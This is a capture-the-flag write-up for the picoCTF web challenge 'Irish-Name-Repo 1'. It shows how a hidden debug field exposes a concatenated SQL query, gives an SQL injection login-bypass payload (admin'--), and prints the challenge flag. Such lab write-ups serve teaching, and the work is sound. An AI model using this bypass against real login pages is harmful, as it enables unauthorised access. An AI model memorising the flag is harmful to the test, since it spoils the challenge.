# Irish-Name-Repo 1

# Description
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` [link](https://jupiter.challenges.picoctf.org/problem/33850/) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
# Solution

- Check the source code in line 28 I found out a hidden text field used to debug with the value "0".
``` html
|<input type="hidden" name="debug" value="0">|
```

- After change it the value "0" to "1" and trying to login as admin with password admin I get an output like this that revels the use of concatenation for the SQL queries that make it vulnerable to an SQL injection attack.

```sql
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```

-  After trying to log in with an SQL query that bypass the password field we get the flag 

```sql 
/*
username: admin'--
password: admin

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

*/
```
# References
- [picoCTF 2019 writeup 7 - Web - Irish-Name-Repo 1](https://youtu.be/0EDbUSDqrng?si=5wrnQMkKZZkg1Dwz)
- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
